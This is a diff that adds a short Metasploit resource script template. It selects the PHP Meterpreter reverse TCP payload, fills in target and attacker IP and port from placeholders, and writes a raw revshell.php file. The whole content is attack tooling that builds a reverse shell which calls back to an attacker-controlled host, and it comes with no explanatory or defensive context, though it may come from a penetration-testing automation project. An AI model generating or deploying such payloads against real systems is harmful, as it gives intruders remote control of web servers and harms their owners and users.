@@ -1,0 +1,6 @@
+use payload/php/meterpreter/reverse_tcp
+set RHOST {{TARGET_IP}}
+set LHOST {{ATTACKER_IP}}
+set LPORT {{ATTACKER_PORT}}
+
+generate -f raw -o {{OUTPUT_DIRECTORY}}/revshell.php
